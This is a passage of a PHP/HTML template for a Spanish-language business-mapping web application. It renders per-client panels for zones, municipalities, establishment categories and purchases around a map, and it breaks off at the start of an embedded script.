                                                                                            <input  type="radio" name="polidelta" id="polideltaC48" onclick="printaPD(\'MUNICIPIO_SANTA_CATARINA\',\'polideltaC48\',10);" />Santa Catarina<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC49" onclick="printaPD(\'MUNICIPIO_SANTIAGO\',\'polideltaC49\',10);" />Santiago<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC50" onclick="printaPD(\'MUNICIPIO_VALLECILLO\',\'polideltaC50\',10);" />Vallecillo<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                    <tr>
                                                                                        <td>
                                                                                            <input  type="radio" name="polidelta" id="polideltaC51" onclick="printaPD(\'MUNICIPIO_VILLALDAMA\',\'polideltaC51\',10);" />Villaldama<br>
                                                                                        </td>
                                                                                    </tr>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>';
                                                            }
                                                    //FIN ->SECCION AGREGAR NUEVO POLOGONO PARA DESARROLLOS DELTA
                                                    ?>

                                                </td >



                                            </tr>
                      <?php
                          if($dominio=="coexito2"){
                                           echo' <tr height="1px">';
                        // https://www.censosmkd.com/_img/coexito.jpg

                                                echo'<td BACKGROUND="_img/coexito.jpg" align="center" bordercolor="#00CC00">';

          echo '<h2 style="background:#298A08" >Zonas Cali </h2> ';
          echo  '<div class="TabbedPanelsContent" aling="Center" >
          <input type="checkbox" id="chkboxZona6" onclick=" ir_a(\'Carrera 80 # Cali, Valle Del Cauca, Colombia\'); chkActivarZonas(\'Zona6\')" />
                    Zona 4 &nbsp&nbsp<br />
                    <input type="checkbox" id="chkboxZona1" onclick="ir_a(\'Acopi Yumbo, Valle del Cauca, Colombia\'); chkActivarZonas(\'Zona1\')" />
                    Zona 5 A <br />

           <input type="checkbox" id="chkboxZona5" onclick="ir_a(\' Parque La Alameda Calle 7, Cali, Valle del Cauca, Colombia\'); chkActivarZonas(\'Zona5\')" />
                    Zona 5 B <br />

          <input type="checkbox" id="chkboxZona3" onclick="ir_a(\'Parque Santander Calle 34, Cali, Valle del Cauca, Colombia\'); chkActivarZonas(\'Zona3\')" />
                    Zona 6 &nbsp&nbsp<br />
                    <input type="checkbox"  id="chkboxZona4"  onclick="ir_a(\'Parque Cien Palos Calle 18 Cali, Valle Del Cauca\'); chkActivarZonas(\'Zona4\')" />
                    Zona 7 &nbsp&nbsp<br />
                    <input type="checkbox" id="chkboxZona2" onclick="ir_a(\'Laguna Del Pandaje Cali, Valle Del Cauca Colombia\'); chkActivarZonas(\'Zona2\')" />
                    Zona 8 &nbsp&nbsp<br />

          </div>';
          }

          if($dominio=="demo3"){
                                           echo' <tr height="1px">';
                        // https://www.censosmkd.com/_img/coexito.jpg

                                                echo'<td  align="center" bordercolor="#00CC00" border=1 bgcolor="#D6D6D6"> ';

          echo '<h2 style="background:#C50707" ><font color="white">Zonas</font> </h2> ';

          echo  '<div class="TabbedPanelsContent" aling="Center" >

          <input type="checkbox" id="chkboxZona9" onclick="ir_a(\'Cuauhtémoc, Ciudad de México, México\'); chkActivarZonas(\'Zona9\'); " />
                    Zona 1 &nbsp<br />



          <input type="checkbox" id="chkboxZona10" onclick="ir_a(\'Cuauhtémoc, Ciudad de México, México\'); chkActivarZonas(\'Zona10\')" />
                    Zona 2  <br />

           <input type="checkbox" id="chkboxZona11" onclick="ir_a(\'Cuauhtémoc, Ciudad de México, México\'); chkActivarZonas(\'Zona11\')" />
                    Zona 3  <br />


                    Operaciones <br />
                <form name="frusuarios">
                   <select name="miszonas"  size="1">
                    <option value="0">Ninguno</option>
             <option value="1">Poblacion</option>
             <option value="2">NSE</option>
             <option value="3">Seguro</option>
          </select>

               </form>

          </div>';
          }




          if($dominio=="holcimmx"){
                                           echo' <tr height="1px">';
                        // https://www.censosmkd.com/_img/coexito.jpg

                                                echo'<td align="center" bordercolor="#00CC00">';

                                      echo  '<div class="TabbedPanelsContent" aling="Center" >

                             Mixto Competencia <img src="' . DIR_TEMA_ACTIVO . '_img/23.png" /> <br />
                             Mixto Holcim  <img src="' . DIR_TEMA_ACTIVO . '_img/14.png" /> <br />
                             Unimarca Competencia <img src="' . DIR_TEMA_ACTIVO . '_img/18.png" /> <br />
                             Unimarca Holcim  <img src="' . DIR_TEMA_ACTIVO . '_img/24.png" "/> <br />
                          </div>';

          }


          ?>

          </td>
          </tr>



                                            <tr height="1px">
                                                <td>
                                                  <?php
                            if(isset($_SESSION['user'])){
                                                        if ($dominio=='fa1' or $dominio=='faprueba' or $dominio=='demo1' or $dominio=='holcimmx' or $dominio=='materiales'){
                                                        echo '<div align="center">Selecciona los establecimientos<br><a href="#" onclick="paso(\'1\')" title="Establecimientos"><img src="' . DIR_TEMA_ACTIVO . '_img/next_'.$dominio.'.png" width="50" height="36" alt="Establecimientos" /></a></div>';
                              }
                              else {
                              echo '<div align="center">Selecciona los establecimientos<br><a href="#" onclick="paso(\'1\')" title="Establecimientos"><img src="' . DIR_TEMA_ACTIVO . '_img/next.png" width="50" height="36" alt="Establecimientos" /></a></div>';
                              }
                              if ($dominio=='faprueba'){
echo '<input  type="checkbox" name="btn22" id="btn22" onclick="pinta_prueba();" /> Prueba CDMX<br>';
                         /*
                                echo '<input  type="checkbox" name="btn1" id="btn1" onclick="mostrarKML();" /> Republica Mexicana<br>';
                                echo '<input  type="checkbox" name="btn4" id="btn4" onclick="printaAguascalientes();" /> Aguascalientes<br>';
                                echo '<input  type="checkbox" name="btn5" id="btn5" onclick="printaBajaCal();" /> Baja California<br>';
                                echo '<input  type="checkbox" name="btn6" id="btn6" onclick="printaCampeche();" /> Campeche<br>';
                                echo '<input  type="checkbox" name="btn2" id="btn2" onclick="printagebs();" /> CDMX<br>';
                                echo '<input  type="checkbox" name="btn7" id="btn7" onclick="printaChiapas();" /> Chiapas<br>';
                                echo '<input  type="checkbox" name="btn8" id="btn8" onclick="printaChihuahua();" /> Chihuahua<br>';
                                echo '<input  type="checkbox" name="btn9" id="btn9" onclick="printaCoahuila();" /> Coahuila<br>';
                                echo '<input  type="checkbox" name="btn10" id="btn10" onclick="printaColima();" /> Colima<br>';
                                echo '<input  type="checkbox" name="btn11" id="btn11" onclick="printaDrurango();" /> Durango<br>';
                                echo '<input  type="checkbox" name="btn3" id="btn3" onclick="printaEdoMex();" /> Estado de México<br>';
                                echo '<input  type="checkbox" name="btn12" id="btn12" onclick="printaGuanajuato();" /> Guanajuato<br>';
                                echo '<input  type="checkbox" name="btn13" id="btn13" onclick="printaGuerrero();" /> Guerrero<br>';
*/
                              }
                              
                            }
                                                    ?>
                                                </td>
                                            </tr>
                                        </table>
                                    </div>
                                    
                                    <!-- compras paso 2-->
                                    <div id="paso2" >
                                        <table border="0" height="100%">
                                            <tr id="trEncabezado3"  height="1px">
                                              <td valign="top">
                                                    <div style="margin-left:20px;margin-right:20px">
                                                        <div style="margin-left:-10px;" align="left">
                                                            <table border="0">
                                                            <!--
                                                                <tr>
                                                                    <td><input type="checkbox" name="mostrarAgebs2" id="mostrarAgebs2" onclick="document.getElementById( 'mostrarAgebs' ).checked = document.getElementById( 'mostrarAgebs2' ).checked; muestraAgebsPolilinea(polilinea);"/>Poblaci&oacute;n</td>
                                                                    <td><img style="display:none" class="mostrarAgebsImg" src="' . DIR_TEMA_ACTIVO . '_img/waiting.gif" /></td>
                                                                </tr>
                                                             -->
                                                                <tr>
                                                                    <td>
                                                                      <div style="display:none" name="divMostrarEtiquetas" id="divMostrarEtiquetas">
                                                                        <input type="checkbox" name="mostrarEtiquetas" id="mostrarEtiquetas" onclick="muestraAgebsPolilinea(polilinea); resize();" />
                                                                        Mostrar etiquetas&nbsp;&nbsp;&nbsp;<a href="#" onclick="ayuda('9');">Ver c&oacute;digo de colores</a>
                                                                      </div>
                                                                    </td>
                                                               </tr>
                                                            </table>
                                                        </div>
      <?php if($dominio=='fa1' or $dominio=='faprueba') { ?>
            <b><font color="blue"><div id="textoAyudaPagina2" name="textoAyudaPagina2">Aqui pondr&aacute; el texto la funci&oacute;n paso(tipo)</div></font></b>
       </div>
                                                    <div align="right">
                                                        <img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/tip.png"'; ?> width="20" height="20"/>
                                                    </div>
                                                    <div style="margin-left:20px;margin-right:20px">
                                                        <b><font color="blue">Hacer doble click sobre el mapa te ayudar&aacute; a acercarlo y enfocarte mejor en una zona!.
                                                        </font></b>
      <?php } else { ?>
       <font color="green"><div id="textoAyudaPagina2" name="textoAyudaPagina2">Aqui pondr&aacute; el texto la funci&oacute;n paso(tipo)</div></font>
                                            </div>
                                                    <div align="right">
                                                        <img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/tip.png"'; ?> width="20" height="20"/>
                                                    </div>
                                                    <div style="margin-left:20px;margin-right:20px">
                                                        <font color="green">Hacer doble click sobre el mapa te ayudar&aacute; a acercarlo y enfocarte mejor en una zona!.
                                                        </font>
                             <?php } ?>
                                                        <!--
                                                        <a href="#" onclick="alert(1); $('#tree3').dynatree('getTree').getNodeByKey('24').reloadChildren();">aqui</a>
                                                          -->
                                                          <br/>
                                    <a href="#" onClick="all_tree2();">Seleccionar Todo</a>
                                                    </div>
                                              </td>
                                            </tr>
                                            <tr valign="top" id="trTree3">
                                                <td>
                                                    <table border="0" height="100%">
                                                        <tr valig="top">
                                                            <td width="10px"></td>
                                                            <td valign="top" height=98% width="275px" style="border:solid 1px #CCC; background-color: #EEEEEE;">
                                                              <input type="text" placeholder="buscar" size="34" id="buscarCategoria" name="buscarCategoria" onChange="seleccionaNodosDynatree(document.getElementById('buscarCategoria').value);" />
                                                                <input type="image" id="imgBuscar" height="16px" width="16px" title="Buscar" src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/lupa.png"'; ?> onclick="seleccionaNodosDynatree(document.getElementById('buscarCategoria').value);" />
                                                                <div id="tree3" class="tree3"></div>
                                                            </td>
                                                            <td width="0px"></td>
                                                        </tr>
                                                    </table>
                                                </td>
                                            </tr>
                                            <tr id="trPie3" height="1px"><td>
                                                <br/>
                                                <div id="divCompra1" name="divCompra1">
                                                    <div align="right">
                                                        <img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/tip.png"'; ?> width="20" height="20"/>
                                                    </div>
                                                    <div style="margin-left:20px;margin-right:20px">
                                                      <?php
                            if ($dominio=='fa1' or $dominio=='faprueba')
                            {
                                                        echo (esCorporativo()?
'<b><font color="blue">Una vez efectuada tu consulta, podr&aacute;s agregar nuevas categor&iacute;as a tu pol&iacute;gono!</font></b><br><br>':
'<b><font color="blue">Una vez efectuada tu compra, podr&aacute;s agregar nuevas categor&iacute;as a tu pol&iacute;gono!</font></b><br><br>');
                            }
                            else
                            {
                            echo (esCorporativo()?
'<font color="green">Una vez efectuada tu consulta, podr&aacute;s agregar nuevas categor&iacute;as a tu pol&iacute;gono!</font><br><br>':
'<font color="green">Una vez efectuada tu compra, podr&aacute;s agregar nuevas categor&iacute;as a tu pol&iacute;gono!</font><br><br>');
                            }
                                                      ?>
                                                    </div>
                                                </div>
                                                <div align="center">
                                                  <table>
                                                      <tr>
                                                          <td>
                                                                <font size="2">Activar Poblaci&oacute;n</font>
                                                                <?php
                                  if (isset($_SESSION['user'])){
                                    echo '<input type="checkbox" name="mostrarAgebs2" id="mostrarAgebs2" onclick="document.getElementById( \'mostrarAgebsL\' ).checked = document.getElementById( \'mostrarAgebs2\' ).checked;
                                        document.getElementById( \'mostrarAgebsC\' ).checked = document.getElementById( \'mostrarAgebs2\' ).checked; muestraAgebsPolilinea(polilinea);"/>';
                                        echo '<input type="checkbox" name="mostrarAgebs2NSE" id="mostrarAgebs2NSE" onclick="document.getElementById( \'mostrarAgebsLNSE\' ).checked = document.getElementById( \'mostrarAgebs2NSE\' ).checked;
                                        document.getElementById( \'mostrarAgebsCNSE\' ).checked = document.getElementById( \'mostrarAgebs2NSE\' ).checked; muestraAgebsPolilineaNSE(polilinea);"/>';
                                  }else{
                                    echo '<input type="checkbox" name="mostrarAgebs2" id="mostrarAgebs2" onclick="document.getElementById( \'mostrarAgebsL\' ).checked = document.getElementById( \'mostrarAgebs2\' ).checked;
                                        muestraAgebsPolilinea(polilinea);"/>';
                                  }
                                ?>
                                                            </td>
                                                            <td>
                                                              <img style="display:none" class="mostrarAgebsImg" src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/waiting.gif"'; ?> />
                                                            </td>
                                                        </tr>
                                                    </table>
                                                </div>
                                                <table width="80%" border="0">
                                                    <tr align="center">
                                                        <td>Regresar<br><a href="#" onclick="paso('0')" title="Regresar"><img src=<?php if ($dominio=='fa1' or $dominio=='faprueba' or $dominio=='demo1' or $dominio=='holcimmx' or $dominio=='materiales'){ echo '"' . DIR_TEMA_ACTIVO . '_img/back_'.$dominio.'.png"';}
                                                          else {echo '"' . DIR_TEMA_ACTIVO . '_img/back.png"';}
                                                         ?> width="50" height="36" title="Regresar" /></a> </td>
                                                        <?php
                            if($dominio=='fa1' or $dominio=='faprueba')
                            {
                                                          echo (esCorporativo()?
'<td id="divCompra2" name="divCompra2"><br><a href="#" onclick="agregar_carrito()" title="Cotizar" ><img src="' . DIR_TEMA_ACTIVO . '_img/agregar_fa1.png"  alt="Agregar consulta" /></a></td>':
'<td id="divCompra2" name="divCompra2">Cotizar<br><a href="#" onclick="agregar_carrito()" title="Cotizar" ><img src="' . DIR_TEMA_ACTIVO . '_img/agregar_carrito.png" width="35" height="36" alt="Agregar al carrito" /></a></td>');
                            }
                            else
                            {
                               echo (esCorporativo()?
'<td id="divCompra2" name="divCompra2"><br><a href="#" onclick="agregar_carrito()" title="Cotizar" ><img src="' . DIR_TEMA_ACTIVO . '_img/agregar.png"  alt="Agregar consulta" /></a></td>':
'<td id="divCompra2" name="divCompra2">Cotizar<br><a href="#" onclick="agregar_carrito()" title="Cotizar" ><img src="' . DIR_TEMA_ACTIVO . '_img/agregar_carrito.png" width="35" height="36" alt="Agregar al carrito" /></a></td>');
                            }

                                                        ?>
                                                    </tr>
                                                </table>
                                            </td></tr>
                                        </table>
                                    </div>
                                </div>
                            </div>
                        </td>
                        <!--Fin compras-->

                        <!-- Consultas Gratuitas Original
                        <td width="300" valign="top" id="gratis2" style="display:none;" >
                            <div id="cont_opciones">
                                <div id="main_opc">
                                    <span class="help"><a href="#" onclick="ayuda('6')" title="Ayuda" ><img src="' . DIR_TEMA_ACTIVO . '_img/help.png" width="33" height="31" alt="Ayuda" /></a></span>
                                    <span class="res">Consultas Gratuitas</span>
                                    <span class="ocultar"><a href="#" onclick="ver_gratis()" title="Ocultar Pesta&ntilde;a" ><img src="' . DIR_TEMA_ACTIVO . '_img/ocultar.png" width="25" height="20" /></a></span>
                                </div>
                                <div style="width:288px;aling-left=20px" class="miscompras" id="miscomprasgratis">
                                    <table border="0" height="100%">
                                        <tr id="trEncabezadoGratis"  height="1px"><td valign="top">
                                            <div style="margin-left:20px;margin-right:20px">
                                                <font color="green">Para hacer una consulta a nuestra base de datos, selecciona una caracter&iacute;stica de la lista siguiente... La aplicaci&oacute;n te mostrar&aacute; en el mapa todos los resultados obtenidos!</font>
                                            </div>
                                            <div align="right">
                                                <img src="' . DIR_TEMA_ACTIVO . '_img/tip.png" width="20" height="20"/>
                                            </div>
                                            <div style="margin-left:20px;margin-right:20px">
                                                <font color="green">Hacer doble click sobre el mapa te ayudar&aacute; a acercarlo y enfocarte mejor en una zona!.<br><img src="' . DIR_TEMA_ACTIVO . '_img/04_maps.png" height="20"/> Navega a la localidad deseada. Puedes hacerlo <a href="#" onclick="buscar()">aqu&iacute;</a></font>
                                            </div>
                                        </td></tr>
                                        <tr valign="top" id="trTreeGratis">
                                            <td>
                                                <table border="0" height="100%">
                                                    <tr valig="top">
                                                        <td width="10px"></td>
                                                        <td valign="top" class="treegratis" style="border:solid 1px #CCC; background-color: #EEEEEE;" class="treegratis">
                                                            <div id="treegratis"></div>
                                                        </td>
                                                        <td width="0px"></td>
                                                    </tr>
                                                </table>
                                            </td>
                                        </tr>
                                        <tr id="trPieGratis" height="1px"><td>
                                            <br/>
                                            <div align="right">
                                                <img src="' . DIR_TEMA_ACTIVO . '_img/notas.gif" width="20" height="20"/>
                                            </div>
                                            <div style="margin-left:20px;margin-right:20px">
                                                <font color="green">Ten en cuenta que las consultas gratuitas solamente podr&aacute;n hacerse sobre una regi&oacute;n limitada, por lo que es posible que el zoom se ajuste autom&aacute;ticamente a este tipo de regi&oacute;n!.<br/><br/></font>
                                            </div>
                                        </td></tr>
                                    </table>
                                </div>
                            </div>
                        </td>
                        -->

                        <!-- Zonas-->
                        <td width="300" valign="top" id="tzonas" style="display:none;" >
                            <div id="cont_opciones">
                                <div id="main_opc">
                                    <span class="help"><a href="#" onclick="ayuda('4')" title="Ayuda" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/help.png"'; ?> width="33" height="31" alt="Ayuda" /></a></span>

                                    <span class="res"></span>
                  <?php if($dominio=='holcimmx' or $dominio=='fa1' or $dominio=='faprueba' or $dominio=='materiales')
                   { ?>
  <span class="ocultar"><a href="#" onclick="opciones_zonas()" title="Ocultar Pesta&ntilde;a" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar_'.$dominio.'.png"'; ?> width="25" height="20" /></a></span>
                                </div>
                <?php } else { ?>
                <span class="ocultar"><a href="#" onclick="opciones_zonas()" title="Ocultar Pesta&ntilde;a" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar.png"'; ?> width="25" height="20" /></a></span>
                </div>
                <?php } ?>
                                <div style="width:288px; padding-left:3px" class="miscompras" id="czonas">
                <?php
                if($dominio=="censossudamerica"){
                ?>
<table>
<tr>


<TD style="background:#f8f8f8" valign="top">


<div style="width:235px; height:700;  border-bottom-style:groove; border:#666; display:block;" id="contenedor2">
 <h2 aling="center"> Busqueda de negocio</h2>
 <br>
 <hr>
 <form name="suda">
 <br>
 <h3>Selecciona Pais</h3>
 <br>
 <select name="Supais" >
                      <option value="COLOMBIA">COLOMBIA</option>
                      <option value="BOLIVIA">BOLIVIA</option>
                      <option value="ECUADOR">ECUADOR</option>
                      <option value="PERU">PERU</option>
            <option value="CHILE">CHILE</option>

            </select>
 <BR>
 <hr>
 <br>
 <h3>selecciona Estado</h3>
 <br>
 <select name="Suestado" >
  <option value='TODOS'>TODOS</option>
                   <option value='BOGOTA'>BOGOTA</option>
 <option value='MEDELLIN'>MEDELLIN</option>
 <option value='CALI'>CALI</option>
 <option value='CARTAGENA'>CARTAGENA</option>
 <option value='BUCARAMANGA'>BUCARAMANGA</option>
 <option value='MONTERIA'>MONTERIA</option>
 <option value='PASTO'>PASTO</option>
 <option value='IBAGUE'>IBAGUE</option>
 <option value='PEREIRA'>PEREIRA</option>
 <option value='VILLAVICENCIO'>VILLAVICENCIO</option>
 <option value='MANIZALEZ'>MANIZALEZ</option>
 <option value='BARRANQUILLA'>BARRANQUILLA</option>
 <option value='SANTA MARTHA'>SANTA MARTHA</option>
 <option value='DUITAMA'>DUITAMA</option>


            </select>
 <BR>

 <HR>

 </form>
 <h3>Nombre del negocio</h3>
 <br>
 <input type="Text" name="nombreNegocio" id="nombreNegocio"  SIZE=20>
 <BR>
 <BR>
 <INPUT Type="BUTTON" VALUE="C O N S U L T A R" onclick="consultaSu()">


 </div>





</td>
</tr>
</table>








                  <?php
                }else{
                  if($dominio=="ipeth"){
                    ?>
                    <table>
<tr>


<TD style="background:#f8f8f8" valign="top">


<div style="width:235px; height:700;  border-bottom-style:groove; border:#666; display:block;" >
 <h2 aling="center"> Agregar rutas de Transporte</h2>
 <br>


 <hr>
 <input type="checkbox" name="exh" id="exh1" onclick="RutaIpeth('exh1')"> Monterrey
 <hr>
 <input type="checkbox" name="exh" id="exh2" onclick="RutaIpeth('exh2')"> Guadalajara
 <hr>
 <input type="checkbox" name="exh" id="exh3" onclick="RutaIpeth('exh3')"> Tijuana
 <hr>
 <input type="checkbox" name="exh" id="exh4" onclick="RutaIpeth('exh4')"> Puebla
 <hr>
 <input type="checkbox" name="exh" id="exh5" onclick="RutaIpeth('exh5')"> Cd. Mexico
 <hr>


  <img src="https://www.invalsa.com.mx/img/cobertura/MAPA.jpg"  width="250" height="150"/>



 </div>





</td>
</tr>
</table>





                  <?php
                  }else{


                ?>
                                    <table border="0" height="100%">
                                        <tr id="trEncabezadoZona"  height="1px"><td valign="top">
                                            <div style="margin-left:20px;margin-right:20px">
                                                <font color="green">La consulta de zonas te permite visualizar de una manera gr&aacute;fica caracter&iacute;sticas en común de una regi&oacute;n<br>Selecciona de la lista siguiente las zonas que deseas mostrar en el mapa!.</font>
                                            </div>
                                            <div align="right">
                                                <img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/tip.png"'; ?> width="20" height="20"/>
                                            </div>
                                            <div style="margin-left:20px;margin-right:20px">
                                                <font color="green">Hacer doble click sobre el mapa te ayudar&aacute; a acercarlo y enfocarte mejor en una zona!.<br><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/04_maps.png"'; ?> height="20"/> Navega a la localidad deseada. Puedes hacerlo <a href="#" onclick="buscar()">aqu&iacute;</a></font>
                                            </div>
                                        </td></tr>
                                        <tr valign="top" id="trTreeZona">
                                            <td>
                                                <table border="0" height="100%">
                                                    <tr valig="top">
                                                        <td width="10px"></td>
                                                        <td valign="top" height=99% width="275px" style="border:solid 1px #CCC; background-color: #EEEEEE;">
                                                            <div id="zonastree"></div>
                                                        </td>
                                                        <td width="0px"></td>
                                                    </tr>
                                                </table>
                                            </td>
                                        </tr>
                                        <tr id="trPieZona" height="1px"><td>
                                            <br/>
                                            <div align="right">
                                                <img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/notas.gif"'; ?> width="20" height="20"/>
                                            </div>
                                            <div style="margin-left:20px;margin-right:20px">
                                                <font color="green">Si al encender una caracter&iacute;stica no ves resultados en el mapa, posiblemente el zoom que has aplicado es muy cercano o no hay datos de esa regi&oacute;n!.<br/><br/></font>
                                            </div>
                                        </td></tr>
                                    </table>
                                </div>


                <?php





                }
                }
                ?>


                  </div>
                        </td>



                        <!-- fin de zonas -->



                        <td width="300" valign="top" id="tcrearzona" style="display:none;" >
                            <div id="cont_opciones">
                                <div id="main_opc">
                                    <span class="help"><a href="#" onclick="ayuda('5')" title="Ayuda" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/help.png"'; ?> width="33" height="31" alt="Ayuda" /></a></span>
                                    <span class="res">Administrar Zonas</span>
                                    <span class="ocultar"><a href="#" onclick="opciones_administrar_zonas()" title="Ocultar Pesta&ntilde;a" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar.png"'; ?> width="25" height="20" /></a></span>
                                </div>
                                <?php echo $zonas_administrar[1];?>
                            </div>
                        </td>

                        <!-- mis compras -->
                        <td width="300" valign="top" id="tcompras" style="display:none;" >
                            <div id="cont_opciones">
                                <div id="main_opc">

                <?php if($dominio=='holcimmx' or $dominio=='fa1' or $dominio=='faprueba' or $dominio=='materiales')
                { ?>
                                    <span class="help"><a href="#" onclick="ayuda('3')" title="Ayuda" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/help_'.$dominio.'.png"'; ?> width="33" height="31" alt="Ayuda" /></a></span>
                  <?php } else { ?>
                    <span class="help"><a href="#" onclick="ayuda('3')" title="Ayuda" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/help.png"'; ?> width="33" height="31" alt="Ayuda" /></a></span>
                  <?php } ?>
                                    <span class="res"><?php echo (esCorporativo()?"Mis Consultas":"Mis Compras"); ?></span>
                <?php if($dominio=='holcimmx' or $dominio=='fa1' or $dominio=='faprueba' or $dominio=='materiales')
                { ?>
                                    <span class="ocultar"><a href="#" onclick="opciones_miscompras()" title="Ocultar Pesta&ntilde;a" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar_'.$dominio.'.png"'; ?> width="25" height="20" /></a></span>
                                </div>
                                <!-- -->
<!-- 
                                <div class="boxContenedor_consultas">
                                <table>

                                
                                    <tr>
                                        <td>
      

<tr><td>
                                <input  type="checkbox" name="btn4" id="btn40" onclick="printaAguascalientes2();" /> Aguascalientes<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn5" id="btn50" onclick="printaBajaCal2();" /> Baja California<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn6" id="btn60" onclick="printaCampeche2();" /> Campeche<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn202" id="btn202" onclick="printagebs2();" /> CDMX <br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn7" id="btn70" onclick="printaChiapas2();" /> Chiapas<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn8" id="btn80" onclick="printaChihuahua2();" /> Chihuahua<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn9" id="btn90" onclick="printaCoahuila2();" /> Coahuila<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn10" id="btn100" onclick="printaColima2();" /> Colima<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn11" id="btn110" onclick="printaDrurango2();" /> Durango<br></td>
                                <td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn3" id="btn3300" onclick="printaEdoMex2();" /> Estado de México<br></td>
                                </tr>
                                <tr><td>
                                <input  type="checkbox" name="btn12" id="btn120" onclick="printaGuanajuato2();" /> Guanajuato<br></td>
                                <td>
                                </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn13" id="btn130" onclick="printaGuerrero2();" /> Guerrero<br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn15" id="btn150" onclick="printaHidalgo2();" /> Hidalgo<br>
                                        </td>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn16" id="btn160" onclick="printaJalisco2();" /> Jalisco<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn17" id="btn170" onclick="printaMichoacan2();" /> Michoacan<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn18" id="btn180" onclick="printaMorelos2();" /> Morelos<br>
                                        </td>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn19" id="btn190" onclick="printaNayarit2();" /> Nayarit<br>
                                        </td>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn140" id="btn140" class="btn14" onclick="printaNuevoLeon2();" /> Nuevo León<br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn20" id="btn200" onclick="printaOaxaca2();" /> Oaxaca<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn21" id="btn210" onclick="printaPuebla2();" /> Puebla<br>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn22" id="btn220" onclick="printaQueretaro2();" /> Queretaro<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn23" id="btn230" onclick="printaQuintanaRoo2();" /> Quintana Roo<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn24" id="btn240" onclick="printaSanLuis2();" /> San Luis Potosi<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn25" id="btn250" onclick="printaSinaloa2();" /> Sinaloa<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn26" id="btn260" onclick="printaSonora2();" /> Sonora<br>
                                        </td>
                                        <tr>
                                        <td>
                                            <input  type="checkbox" name="btn27" id="btn270" onclick="printaTabasco2();" /> Tabasco<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn28" id="btn280" onclick="printaTamaulipas2();" /> Tamaulipas<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn29" id="btn290" onclick="printaTlaxcala2();" /> Tlaxcala<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn30" id="btn300" onclick="printaVeracruz2();" /> Veracruz<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn31" id="btn310" onclick="printaYucatan2();" /> Yucatan<br>
                                        </td>
                                        </tr>
                                    <tr>
                                        <td>
                                            <input  type="checkbox" name="btn32" id="btn320" onclick="printaZacatecas2();" /> Zacatecas<br>
                                        </td>
                                        </tr>

  
                                            
                                        </td>
                                    </tr>
                                    
                                </table>
                                </div>
-->
                               <!-- -->
                <?php } else { ?>
                  <span class="ocultar"><a href="#" onclick="opciones_miscompras()" title="Ocultar Pesta&ntilde;a" ><img src=<?php echo '"' . DIR_TEMA_ACTIVO . '_img/ocultar.png"'; ?> width="25" height="20" /></a></span>
                                </div>
                <?php } ?>

                                <div class="boxContenedor_consultas2">
                                <!-- Inician Mis Compras-->
                                <?php echo $miscompras[1];?>
                              </div>
                            </div>
                        </td>
                        <!-- fin mis compras -->

                        <!-- mapa y ajuste de nuevo chat de dudas /11/12/2015 mario-->
                        <td align="left" id="tdMapa">
                            <div id="mapa" class="mapa" name="mapa" ></div>
                            <!--<div id="contenedorCanvas" style="border: 1px solid red;"> </div>-->
                            


      <div id="soportec" style="position: fixed; top: 9%; right: 0;">
       <?php
if($dominio!="censosmkd"){
   echo ' <script>

function p001(){
